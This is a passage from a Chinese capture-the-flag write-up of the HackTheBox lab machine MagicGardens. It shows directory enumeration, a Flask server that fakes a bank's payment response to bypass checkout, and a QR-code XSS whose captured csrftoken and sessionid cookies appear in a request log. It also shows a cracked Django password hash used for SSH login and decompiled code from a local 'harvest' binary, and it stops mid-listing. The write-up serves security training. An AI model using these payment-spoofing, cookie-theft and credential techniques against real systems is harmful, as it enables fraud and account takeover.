class="code"><pre><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/login =&gt; http://magicgardens.htb/login/</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/search =&gt; http://magicgardens.htb/search/</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/register =&gt; http://magicgardens.htb/register/</span><br><span class="line">200      GET       36l      234w    16516c http://magicgardens.htb/static/store/logo.png</span><br><span class="line">200      GET      112l      199w    14103c http://magicgardens.htb/static/store/star.png</span><br><span class="line">200      GET       15l       73w     5934c http://magicgardens.htb/static/store/twitter.png</span><br><span class="line">200      GET       14l       80w     4316c http://magicgardens.htb/static/store/facebook.png</span><br><span class="line">200      GET       16l      128w     7376c http://magicgardens.htb/static/store/cart_dark.png</span><br><span class="line">200      GET      157l      611w     9042c http://magicgardens.htb/catalog/Rose</span><br><span class="line">200      GET      147l      572w     8604c http://magicgardens.htb/catalog/Chrysanthemum</span><br><span class="line">200      GET        9l       68w     5087c http://magicgardens.htb/static/store/youtube.png</span><br><span class="line">200      GET       17l      113w     7571c http://magicgardens.htb/static/store/instagram.png</span><br><span class="line">200      GET      161l      616w     9222c http://magicgardens.htb/catalog/Carnation</span><br><span class="line">200      GET      151l      654w     9132c http://magicgardens.htb/catalog/Tulip</span><br><span class="line">200      GET      126l      541w     7382c http://magicgardens.htb/catalog/Lilium</span><br><span class="line">200      GET       17l      219w    16221c http://magicgardens.htb/static/store/cart.png</span><br><span class="line">200      GET      143l      575w     8420c http://magicgardens.htb/catalog/Gerbera</span><br><span class="line">200      GET      151l      621w     8911c http://magicgardens.htb/catalog/Orchid</span><br><span class="line">200      GET      140l      588w     8139c http://magicgardens.htb/catalog/Snowdrop</span><br><span class="line">200      GET      122l      519w     7112c http://magicgardens.htb/catalog/Iris</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/profile =&gt; http://magicgardens.htb/profile/</span><br><span class="line">200      GET      156l      479w    35302c http://magicgardens.htb/static/store/catalog.png</span><br><span class="line">200      GET      163l      651w    48532c http://magicgardens.htb/static/store/favicon.png</span><br><span class="line">200      GET      139l      325w    21887c http://magicgardens.htb/static/store/login.png</span><br><span class="line">200      GET      150l      456w    30261c http://magicgardens.htb/static/store/heart.png</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/subscribe =&gt; http://magicgardens.htb/subscribe/</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/cart =&gt; http://magicgardens.htb/cart/</span><br><span class="line">403      GET        7l        9w      153c http://magicgardens.htb/media/uploads/</span><br><span class="line">403      GET        7l        9w      153c http://magicgardens.htb/static/store/</span><br><span class="line">200      GET     1385l     7878w   615881c http://magicgardens.htb/media/uploads/gerbera.jpg</span><br><span class="line">200      GET      853l     5257w   330945c http://magicgardens.htb/media/uploads/lilium.jpg</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/wish_list =&gt; http://magicgardens.htb/wish_list/</span><br><span class="line">403      GET        7l        9w      153c http://magicgardens.htb/static/</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/catalog =&gt; http://magicgardens.htb/catalog/</span><br><span class="line">301      GET        0l        0w        0c http://magicgardens.htb/admin =&gt; http://magicgardens.htb/admin/</span><br><span class="line">200      GET     1091l     7314w   577616c http://magicgardens.htb/media/uploads/iris.jpg</span><br><span class="line">403      GET        7l        9w      153c http://magicgardens.htb/media/</span><br><span class="line">200      GET     2336l    13564w  1082094c http://magicgardens.htb/static/store/promo.jpg</span><br><span class="line">200      GET     1816l    11145w   869024c http://magicgardens.htb/media/uploads/tulip.jpg</span><br><span class="line">200      GET     1048l     6639w   459217c http://magicgardens.htb/media/uploads/snowdrop.jpg</span><br><span class="line">200      GET        0l        0w   255080c http://magicgardens.htb/media/uploads/orchid.jpg</span><br><span class="line">200      GET        0l        0w   518517c http://magicgardens.htb/media/uploads/%D1%81hrysanthemum.jpg</span><br><span class="line">200      GET        0l        0w   498589c http://magicgardens.htb/media/uploads/rose.jpg</span><br><span class="line">200      GET        0l        0w   398855c http://magicgardens.htb/media/uploads/carnations.jpg</span><br><span class="line">200      GET        0l        0w   280602c http://magicgardens.htb/static/store/bootstrap.css</span><br><span class="line">200      GET        0l        0w   290998c http://magicgardens.htb/static/store/promo_2.png</span><br><span class="line">200      GET      458l     1853w    30861c http://magicgardens.htb/</span><br><span class="line">301      GET        7l       11w      169c http://magicgardens.htb/static/store =&gt; http://magicgardens.htb/static/store/</span><br><span class="line">301      GET        7l       11w      169c http://magicgardens.htb/media/uploads =&gt; http://magicgardens.htb/media/uploads/</span><br><span class="line">301      GET        7l       11w      169c http://magicgardens.htb/static/admin =&gt; http://magicgardens.htb/static/admin/</span><br><span class="line">301      GET        7l       11w      169c http://magicgardens.htb/static/admin/img =&gt; http://magicgardens.htb/static/admin/img/</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="尝试-未登录状态下"><a href="#尝试-未登录状态下" class="headerlink" title="尝试-未登录状态下"></a>尝试-未登录状态下</h2><p><img src="/wpimages/2024/magicgardens/web1.jpg" alt="web1"></p>
<p>看到这里我可以填写地址啥的直接一个xss，但是没有返回，不过这个目前我还没登陆的状态下是这样的，等一会登录再试试。</p>
<p><img src="/wpimages/2024/magicgardens/web2.jpg" alt="web2"></p>
<p>这里提交订单后有显示提交成功，其中提到 </p>
<blockquote>
<p><em>24小时内会有他们经理和我联系，并且出示QR码会有优惠</em></p>
</blockquote>
<p>这里我考虑到会联系我应该有两种可能：</p>
<ul>
<li>1.登陆后有联系渠道</li>
<li>2.直接给我邮箱服务器发邮件</li>
</ul>
<p>由于我着实没想到我除了劫持他dns解析之外他怎么给我发邮件，所以一会登录再测测这个功能。</p>
<hr>
<p>再看看有没有sql注入</p>
<p><img src="/wpimages/2024/magicgardens/web3.jpg" alt="web3"></p>
<p>这里试了下没有</p>
<hr>
<p><img src="/wpimages/2024/magicgardens/web5.jpg" alt="web5"></p>
<p>看了下能不能通过重置密码爆破出用户..发现全是200所以这个pass</p>
<hr>
<p><img src="/wpimages/2024/magicgardens/web7.jpg" alt="web5"></p>
<p>然后是我当时枚举的时候，发现它有账号注册的地方，就考虑注册用户遍历，当时是跑出来目标用户名了，不过当时我拿着也没啥鸟用..</p>
<hr>
<h3 id="有坑的地方"><a href="#有坑的地方" class="headerlink" title="有坑的地方"></a>有坑的地方</h3><p><img src="/wpimages/2024/magicgardens/web4.jpg" alt="web4"></p>
<p>这个我想随便构造个参到购物车，加完之后购物车，访问购物车直接error 500,要re机器才行..（添加收藏也是一样的，不要轻易尝试）</p>
<hr>
<h2 id="尝试-登录状态下"><a href="#尝试-登录状态下" class="headerlink" title="尝试-登录状态下"></a>尝试-登录状态下</h2><p><img src="/wpimages/2024/magicgardens/web9.jpg" alt="web9"></p>
<p><img src="/wpimages/2024/magicgardens/web10.jpg" alt="web10"></p>
<p>这波登录之后尝试了下这个购买功能还是没有xss，然后我看说是买20个免运费，然后又买了20个还是不行，所以最终这个部分pass了</p>
<hr>
<p><img src="/wpimages/2024/magicgardens/web11.jpg" alt="web11"></p>
<p>这部分我尝试了下xss也是不行，上传也是g</p>
<hr>
<p><img src="/wpimages/2024/magicgardens/web12.jpg" alt="web12"></p>
<p>再找到这个账户升级的页面，但是要扣钱，最主要的是还一直是失败</p>
<p><img src="/wpimages/2024/magicgardens/web13.jpg" alt="web13"></p>
<p>不过我看到他是有请求到这三个银行的，所以我觉得可能他会存在银行的servername或者别的接口，所以我这里优先把这三个银行域名添加到host然后进行dir爆破。</p>
<p>然后发现确实是存在的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">└─$ feroxbuster -u http://magicalbank.htb/api -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -d 3</span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.10.1</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ http://magicalbank.htb/api</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt</span><br><span class="line"> 👌  Status Codes          │ All Status Codes!</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.10.1</span><br><span class="line"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> 🔎  Extract Links         │ <span class="literal">true</span></span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔃  Recursion Depth       │ 3</span><br><span class="line"> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">404      GET       10l       21w      179c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">301      GET        0l        0w        0c http://magicalbank.htb/api/sessions =&gt; http://magicalbank.htb/api/sessions/</span><br><span class="line">301      GET        0l        0w        0c http://magicalbank.htb/api/createAccount =&gt; http://magicalbank.htb/api/createAccount/</span><br><span class="line">301      GET        0l        0w        0c http://magicalbank.htb/api/payments =&gt; http://magicalbank.htb/api/payments/</span><br></pre></td></tr></table></figure>

<p>然后对着几个接口进行了访问</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl http://magicalbank.htb/api/createAccount/ -XPOST</span><br><span class="line">&#123;<span class="string">&quot;accountCode&quot;</span>: <span class="string">&quot;9125649562&quot;</span>, <span class="string">&quot;pspReference&quot;</span>: <span class="string">&quot;UD8DPQ6qQ0UK2&quot;</span>&#125;  </span><br></pre></td></tr></table></figure>
<p>这个接口我没看懂是干啥的，我寻思是要拿着这个塞cookies里，然后去访问银行..试了半天并不是。</p>
<p><img src="/wpimages/2024/magicgardens/web14.jpg" alt="web14"></p>
<p>这位更是逆天，直到我写wp时都没搞明白这个session接口是干啥的。</p>
<hr>
<p><img src="/wpimages/2024/magicgardens/web15.jpg" alt="web15"></p>
<p>然后我试了下是不是存在ssrf还是啥的，发现有蹊跷，这里我给了个127.0.0.1他直接给报错了，如果是连接的银行的话会是下面这个样子</p>
<p><img src="/wpimages/2024/magicgardens/web16.jpg" alt="web16"></p>
<p>转半天才会报错，所以我猜测他可能是需要访问到接口才可以，所以他正常是访问到了bank的api的，估计是出了啥问题，所以当时用mitmweb 开了个监听然后把转发站点改成了magicalbank.htb，进行一个看他俩站点交互时候到底发生了神魔事。</p>
<p><img src="/wpimages/2024/magicgardens/web17.jpg" alt="web17"></p>
<p>芝士商城的请求</p>
<p><img src="/wpimages/2024/magicgardens/web18.jpg" alt="web18"></p>
<p>芝士bank的返回</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;cardname&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cardnumber&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">    <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Payment Required&quot;</span>,</span><br><span class="line">    <span class="string">&quot;status&quot;</span>: <span class="string">&quot;402&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我当时以为是银行没钱导致的，所以改了一下请求的钱数umount，bank返回还是402。考虑到这个应该是有问题，所以尝试换个方向思考，是不是验证由商城那边做的，是对bank哪个返回值做出了判断还是有进一步的联动校验。</p>
<p>..所以写个了假返回简单试了下，一开始我给的是访问会返回<code>status 200</code>，试了下没啥反应，然后又改了改加了银行测返回的<code>json</code>里<code>status</code>的值和别的几个key，发现改了<code>status</code>成了。喜提vip</p>
<p>这是脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">catch_all</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;status&quot;: &quot;200&quot;, &quot;message&quot;: &quot;Payment Required&quot;, &quot;cardname&quot;: &quot;123&quot;, &quot;cardnumber&quot;: &quot;aa&quot;&#125;&#x27;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">3000</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2024/magicgardens/web19.jpg" alt="web19"></p>
<p>get QR</p>
<hr>
<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>这里千万返回消息要给全了，他好像是会匹配四个key，全有才行，我手贱message去掉了，直接账户卡这个页面了。</p>
<p><em>这里我留了个小坑咦嘻嘻。</em></p>
<hr>
<p>这里我已经是大会员了，购买时候尝试一下信息里给xss，试了下还是不行。</p>
<p>不过拿到QR之后再尝试买东西就会有人联系了，</p>
<p><img src="/wpimages/2024/magicgardens/web20.jpg" alt="web20"></p>
<p>这里我卡了很长时间，xss直接丢过去是不行的。最后朋友提醒了一下是因为对面那需要扫二维码，所以是二维码可以做xss。</p>
<p><img src="/wpimages/2024/magicgardens/web21.jpg" alt="web21"></p>
<p>按照这个思路我发现download时候好像可以用他的base64自定义二维码内容..不过给xss的语句出来的二维码，扫时候发现会被过滤掉。</p>
<p>没办法就还是去找了个生成的：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://cli.im/text/other">https://cli.im/text/other</a></p>
<p><a target="_blank" rel="noopener" href="https://www.the-qrcode-generator.com/">https://www.the-qrcode-generator.com/</a></p>
</blockquote>
<p>这俩都成</p>
<p>然后发给对面等了半天就喜提cookies了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?c=csrftoken=TQfakXOEyOcqpaUwwnu4JTwHdlCyBxwc;%20sessionid=.eJxNjU1qwzAQhZNFQgMphZyi3QhLluNoV7rvqgcwkixFbhMJ9EPpotADzHJ63zpuAp7d977Hm5_V7265mO4bH-GuJBO9PBuE1TnE_IWwTlnmksbgLUtrETafQ3LdaUgZYYGwnVCH4rOJ6Naw0TLmfz_SdqKZvu9kya67POqGHmHJEHazTEn9Yfwonvp36Y-B6OBzHBS5VMjVJvIaenN6uXUfZgNOJofwTBttmW0FrU3VcGbMgWlRKcWptIIy2Ryqfa1t0-o9VYqpyrCaG061amuuhcBC_gDes2X7:1sBrZf:Hfxfpt7QMKfaGCzyy_Xg0tM8OGgFXonT_TYGAQeTtpg</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="LOGIN-morty"><a href="#LOGIN-morty" class="headerlink" title="LOGIN morty"></a>LOGIN morty</h2><p><img src="/wpimages/2024/magicgardens/web22.jpg" alt="web22"></p>
<p>可以看到是登陆到了morty这个用户的（这里弱智了，应该去登录django的，在这又试了半天商城）</p>
<p>然后去登陆一下django，在一顿乱点之下发现了个hash，我还以为要上cve来着..</p>
<p><img src="/wpimages/2024/magicgardens/web23.jpg" alt="web23"></p>
<p>hashcat 跑了下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j<span class="variable">$e7bq8dE</span>/U+yIiZ8isA0Dc0wuL0gYI3GjmmdzNU+Nl7I=:jonasbrothers</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="SSH-morty"><a href="#SSH-morty" class="headerlink" title="SSH morty"></a>SSH morty</h3><p>没想到ssh直接进来了..</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ ssh morty@10.10.11.9                         </span><br><span class="line">morty@10.10.11.9<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux magicgardens 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">morty@magicgardens:~$ ls</span></span><br></pre></td></tr></table></figure>

<p>这里简单收集了一下主机信息，这部分没啥特别重要的东西。</p>
<p>快进到ps看到alex的进程，脱下来harvest直接开pwn。</p>
<p>这里harvest分为server和cli，所以我的思路是alex开着server，所以审计重点应该是在server部分。</p>
<p><img src="/wpimages/2024/magicgardens/web24.jpg" alt="web24"></p>
<p>这里检测<code>s1</code>系不系<code>server</code>,一眼<code>arg</code>给<code>server</code>，所以这个就是<code>server</code>入口</p>
<p>接着就到了<code>harvest_listen</code>监听方法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">harvest_listen</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, __int64 a2, <span class="type">const</span> <span class="type">char</span> *a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> optval; <span class="comment">// [rsp+30h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> raw_socket; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  fd = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  raw_socket = create_raw_socket(a3);</span><br><span class="line">  optval = <span class="number">1</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Socket creation failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( setsockopt(fd, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Failed to reuse address option&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v9;</span><br><span class="line">  BYTE1(v4) = BYTE1(v9) | <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">if</span> ( fcntl(fd, <span class="number">2</span>, v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] fcntl server error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  addr = <span class="number">0LL</span>;</span><br><span class="line">  addr.sa_family = <span class="number">2</span>;</span><br><span class="line">  *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = htonl(<span class="number">0</span>);</span><br><span class="line">  *(_WORD *)addr.sa_data = htons(a1);</span><br><span class="line">  <span class="keyword">if</span> ( bind(fd, &amp;addr, <span class="number">0x10</span>u) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Bind failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( listen(fd, <span class="number">5</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[x] Listen on port %d failed\n&quot;</span>, a1);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Listening on interface %s\n&quot;</span>, a3);</span><br><span class="line">  handle_connections((<span class="type">unsigned</span> <span class="type">int</span>)fd, raw_socket, a2, a4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要关注<code>handle_connections((unsigned int)fd, raw_socket, a2, a4)</code>方法，因为上面都是初始化啥的，因为他服务端那边都跑起来了所以暂时先过掉。</p>
<p>这个方法是监听连接的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; ; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( m &gt; v20 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    <span class="keyword">if</span> ( (readfds.fds_bits[m / <span class="number">64</span>] &amp; (<span class="number">1LL</span> &lt;&lt; (m &amp; <span class="number">0x3F</span>))) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( m == a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = accept(a1, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v11 &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;[x] Failed to accept connection&quot;</span>);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)harvest_handshake_server((<span class="type">unsigned</span> <span class="type">int</span>)v11, a3) ) <span class="comment">//&lt;--判断服务侧连接监听对象情况</span></span><br><span class="line">        &#123;</span><br><span class="line">          v4 = v15;</span><br><span class="line">          BYTE1(v4) = BYTE1(v15) | <span class="number">8</span>;</span><br><span class="line">          <span class="keyword">if</span> ( fcntl(v11, <span class="number">2</span>, v4) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] fcntl client error&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          v9[v11 / <span class="number">64</span>] |= <span class="number">1LL</span> &lt;&lt; (v11 &amp; <span class="number">0x3F</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v11 &gt; v20 )</span><br><span class="line">            v20 = v11;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( m == a2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">        handle_raw_packets((<span class="type">unsigned</span> <span class="type">int</span>)m, s, a4); <span class="comment">//&lt;--在m==a2 也就是服务连接到了监听对象后，对监听到的包进行处理</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (v9[m / <span class="number">64</span>] &amp; (<span class="number">1LL</span> &lt;&lt; (m &amp; <span class="number">0x3F</span>))) != <span class="number">0</span> )</span><br><span class="line">      handle_client((<span class="type">unsigned</span> <span class="type">int</span>)m, v9, (<span class="type">unsigned</span> <span class="type">int</span>)v20, s); <span class="comment">//&lt;--客户端侧处理</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里其实我卡了一天多，主要找不到利用点，然后朋友说先用<code>harvest_handshake_server</code>方法让它进监听模式后面才有得搞。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">harvest_handshake_server</span><span class="params">(<span class="type">int</span> a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-40h] BYREF</span></span><br><span class="line">  __int128 v7; <span class="comment">// [rsp+60h] 